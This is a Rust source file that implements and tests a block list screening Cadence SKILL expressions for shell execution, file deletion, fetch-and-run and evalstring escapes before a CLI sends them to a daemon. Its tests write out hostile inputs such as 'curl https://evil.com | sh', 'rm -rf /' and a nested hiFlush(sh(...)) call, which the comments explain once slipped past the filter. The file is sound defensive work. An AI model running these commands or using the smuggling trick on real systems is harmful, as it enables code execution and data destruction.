//! evalstring whitelist — blocks dangerous SKILL patterns at the CLI client side,
//! before the request is serialized and sent over TCP to the daemon.

/// Whitelist entry type.
#[derive(Clone, Debug)]
#[allow(dead_code)]
pub enum WhitelistEntry {
    /// Case-insensitive substring match
    Substring(&'static str),
    /// Substring match that allows specific safe prefixes (e.g. `hiFlush`).
    /// Only blocks if the substring is found AND no allowlisted prefix precedes it.
    SubstringWithAllowlist {
        pattern: &'static str,
        allowlist: &'static [&'static str],
    },
    /// Case-insensitive word-boundary match on a function name (e.g. `\bsystem\(`).
    /// Prevents `hiSystem` matching as `system(`.
    FunctionName(&'static str),
    /// Case-insensitive match anchored at a word boundary (e.g. `\bdd `).
    /// For shell-command names that are also substrings of ordinary identifiers:
    /// plain `Substring("dd ")` blocks `error("terminal VDD has no pin")`, and
    /// `VDD` is the most common net name in analog design.
    WordBoundary(&'static str),
}

impl WhitelistEntry {
    fn matches(&self, code: &str) -> bool {
        match self {
            Self::Substring(needle) => code.to_lowercase().contains(&needle.to_lowercase()),
            Self::SubstringWithAllowlist { pattern, allowlist } => {
                let pattern_lc = pattern.to_lowercase();
                let code_lc = code.to_lowercase();
                if !code_lc.contains(&pattern_lc) {
                    return false;
                }
                // The allowlist exists for one narrow reason: an allowlisted
                // function's OWN NAME contains the pattern (`hiFlush(` contains
                // `sh(`). So when the expression starts with such a call, the
                // exemption must cover exactly that one occurrence — the name
                // itself — and nothing else.
                //
                // Re-testing only the remainder is what makes that precise.
                // A blanket `return false` on the prefix would exempt the whole
                // expression, so `hiFlush(sh("rm -rf /"))` would sail through:
                // SKILL evaluates innermost-first, running the shell command
                // before the outer call is even applied.
                //
                // Safe:  hiFlush()   hiFlush(1 2)
                // Block: sh(x)  system(sh(x))  Fish(sh(x))  hiFlush(sh(x))
                for safe in *allowlist {
                    let safe_call = format!("{}(", safe.to_lowercase());
                    if let Some(rest) = code_lc.strip_prefix(&safe_call) {
                        return rest.contains(&pattern_lc);
                    }
                }
                true // dangerous context
            }
            Self::FunctionName(name) => {
                let pattern = format!(r"(?i)\b{name}\(");
                regex::Regex::new(&pattern)
                    .map(|r| r.is_match(code))
                    .unwrap_or(false)
            }
            Self::WordBoundary(needle) => {
                let pattern = format!(r"(?i)\b{}", regex::escape(needle));
                regex::Regex::new(&pattern)
                    .map(|r| r.is_match(code))
                    .unwrap_or(false)
            }
        }
    }
}

/// Default dangerous patterns to block.
fn default_dangerous() -> Vec<WhitelistEntry> {
    vec![
        // Shell invocations
        WhitelistEntry::Substring("system("),
        // sh( blocked except when the expression starts with a UI function whose
        // own name contains "sh(" as a substring. Only `hiFlush` qualifies:
        //   "hiflush("  contains "sh("  -> needs the exemption
        //   "hishell("  does NOT        -> never needed it
        // `hiShell` was on this list too. Because a bare `hiShell()` never
        // matches the pattern in the first place, the only expression the entry
        // could ever permit was one that starts with `hiShell(` and contains
        // `sh(` somewhere else — i.e. `hiShell(sh("rm -rf /"))`, which SKILL
        // evaluates innermost-first, running the shell command before the outer
        // call fails. It was a bypass with no legitimate use, doubly so since
        // `hiShell` does not exist on IC23.1 (`getd` -> nil, absent from all 41
        // SKILL Finder databases). Removed.
        // Blocks: sh(x)  system(sh(x))  Fish(sh(x))  hiShell(sh(x))
        // Allows: hiFlush()  hiFlush(1 2)
        WhitelistEntry::SubstringWithAllowlist {
            pattern: "sh(",
            allowlist: &["hiFlush"],
        },
        WhitelistEntry::Substring("csh "),
        WhitelistEntry::Substring("exec("),
        WhitelistEntry::Substring("pipe("),
        // File deletion
        WhitelistEntry::Substring("rm -rf"),
        WhitelistEntry::Substring("deleteFile("),
        WhitelistEntry::Substring("unlink("),
        WhitelistEntry::Substring("rmdir("),
        // Network fetch + execute (curl/wget with shell redirect or pipe)
        WhitelistEntry::Substring("curl "),
        WhitelistEntry::Substring("wget "),
        WhitelistEntry::Substring("| sh"),
        WhitelistEntry::Substring("|sh"),
        WhitelistEntry::Substring("; sh"),
        WhitelistEntry::Substring(";sh"),
        // Raw disk I/O. `dd` needs a word boundary: it is a substring of `VDD`,
        // and the raw-disk form `dd if=/dev/...` is caught by `/dev/` anyway.
        WhitelistEntry::WordBoundary("dd "),
        WhitelistEntry::Substring("/dev/"),
        WhitelistEntry::Substring("/proc/"),
        // Process / IPC injection
        WhitelistEntry::Substring("ipcBeginProcess"),
        WhitelistEntry::Substring("send("),
        WhitelistEntry::Substring("load(\""),
        // SKILL evalstring bypass
        WhitelistEntry::Substring("evalstring"),
        WhitelistEntry::Substring("evstring"),
    ]
}

/// evalstring whitelist with sandbox mode.
#[derive(Clone, Debug)]
pub struct EvalstringWhitelist {
    entries: Vec<WhitelistEntry>,
    /// When true, evalstring itself is disabled (readonly/sandbox mode)
    sandbox: bool,
}

impl Default for EvalstringWhitelist {
    fn default() -> Self {
        Self::strict()
    }
}

impl EvalstringWhitelist {
    /// Strict whitelist for normal CLI use — blocks dangerous patterns.
    pub fn strict() -> Self {
        Self {
            entries: default_dangerous(),
            sandbox: false,
        }
    }

    /// Sandbox mode — blocks everything except read-only queries.
    #[allow(dead_code)]
    pub fn sandbox() -> Self {
        Self {
            entries: default_dangerous(),
            sandbox: true,
        }
    }

    /// Returns `Some(reason)` if the code is blocked.
    pub fn check(&self, code: &str) -> Option<String> {
        if self.sandbox && code.contains("evalstring") {
            return Some("evalstring is disabled in readonly/sandbox mode".into());
        }
        for entry in &self.entries {
            if entry.matches(code) {
                return Some(format!(
                    "blocked: matches dangerous pattern '{}'",
                    match entry {
                        WhitelistEntry::Substring(s) => *s,
                        WhitelistEntry::SubstringWithAllowlist { pattern, .. } => *pattern,
                        WhitelistEntry::FunctionName(n) => *n,
                        WhitelistEntry::WordBoundary(s) => *s,
                    }
                ));
            }
        }
        None
    }

    /// Enable sandbox/readonly mode.
    pub fn enable_sandbox(&mut self) {
        self.sandbox = true;
    }

    pub(crate) fn is_sandbox(&self) -> bool {
        self.sandbox
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn wl() -> EvalstringWhitelist {
        EvalstringWhitelist::strict()
    }

    fn sandbox_wl() -> EvalstringWhitelist {
        EvalstringWhitelist::sandbox()
    }

    #[test]
    fn block_rm_rf() {
        assert!(wl().check("rm -rf /").is_some());
        assert!(wl().check("system(\"rm -rf /\")").is_some());
    }

    #[test]
    fn block_curl_sh() {
        assert!(wl().check("curl https://evil.com | sh").is_some());
        assert!(wl().check("wget https://evil.com -O - | sh").is_some());
    }

    #[test]
    fn block_system() {
        assert!(wl().check("system(\"find /\")").is_some());
        assert!(wl().check("sh(\"ls -la\")").is_some());
    }

    #[test]
    fn block_sh_except_hi_prefixed_ui_functions() {
        // sh( in dangerous contexts is blocked
        assert!(wl().check("sh(x)").is_some());
        assert!(wl().check("system(sh(x))").is_some());
        assert!(wl().check("Fish(sh(x))").is_some());
        // hiFlush's own name contains 'sh(' — it needs the exemption
        assert!(wl().check("hiFlush()").is_none());
        assert!(wl().check("hiFlush(1 2)").is_none());
        // A bare hiShell() never contains the pattern, so it passes without
        // any allowlist entry. (It is also undefined on IC23.1.)
        assert!(wl().check("hiShell()").is_none());
    }

    /// The `sh(` allowlist exempts a function whose own name contains the
    /// pattern (`hiFlush(`). The exemption must cover that one occurrence only.
    ///
    /// It used to exempt the whole expression whenever it *started with* an
    /// allowlisted call, so `hiFlush(sh("rm -rf /"))` passed the guard —
    /// and SKILL evaluates innermost-first, so the shell command would have run
    /// before the outer call was applied. `hiShell` was on the list for the same
    /// reason, except a bare `hiShell()` never contains `sh(` at all: that entry
    /// had no legitimate use whatsoever, only the smuggling one. Both are fixed;
    /// guard against reintroducing either.
    #[test]
    fn allowlisted_prefix_cannot_smuggle_a_nested_shell_call() {
        assert!(wl().check(r#"hiFlush(sh("rm -rf /"))"#).is_some());
        assert!(wl().check(r#"hiflush(sh("id"))"#).is_some());
        assert!(wl().check(r#"hiShell(sh("rm -rf /"))"#).is_some());
        assert!(wl().check(r#"hishell(sh("id"))"#).is_some());
        // ...while the legitimate calls still pass.
        assert!(wl().check("hiFlush()").is_none());
        assert!(wl().check("hiFlush(1 2)").is_none());
    }

    #[test]
    fn block_ipc() {
        assert!(wl().check("ipcBeginProcess(\"ls\")").is_some());
        assert!(wl().check("load(\"/tmp/evil.il\")").is_some());
    }

    #[test]
    fn block_evalstring() {
        assert!(wl().check("evalstring(\"system()\")").is_some());
    }

    #[test]
    fn sandbox_blocks_evalstring() {
        let mut w = wl();
        w.enable_sandbox();
        assert!(w.check("evalstring(\"system()\")").is_some());
        assert!(w.check("1+1").is_none()); // sandbox blocks evalstring, not safe code
    }

    #[test]
    fn allow_safe_code() {
        let w = wl();
        assert!(w.check("1+1").is_none());
        assert!(w
            .check("dbOpenCellViewByType(\"analogLib\" \"nmos4\" \"symbol\")")
            .is_none());
        assert!(w.check("maeSetVar(\"Vdd\" \"1.8\")").is_none());
        assert!(w.check("geGetEditCellView()~>cellName").is_none());
    }

    #[test]
    fn allow_safe_code_sandbox() {
        let w = sandbox_wl();
        // evalstring itself is blocked
        assert!(w.check("evalstring(\"1+1\")").is_some());
        // but read-only expressions not containing evalstring are fine
        assert!(w
            .check("dbOpenCellViewByType(\"analogLib\" \"nmos4\" \"symbol\")")
            .is_none());
    }

    #[test]
    fn block_dev_proc() {
        assert!(wl().check("dd if=/dev/zero of=/tmp/x").is_some());
        assert!(wl().check("/proc/self/cmdline").is_some());
    }

    #[test]
    fn dd_needs_a_word_boundary() {
        // `dd` as a bare command is still blocked...
        assert!(wl().check("system(\"dd if=/x of=/y\")").is_some());
        // ...but `VDD` is the most common net name in analog design, and it
        // used to trip the raw-disk pattern from inside a quoted message.
        assert!(wl()
            .check("error(\"label_term: terminal VDD has no pin\")")
            .is_none());
        assert!(wl()
            .check("sprintf(nil \"%s stub net=%s\" \"M1\" \"VDD \")")
            .is_none());
    }
}
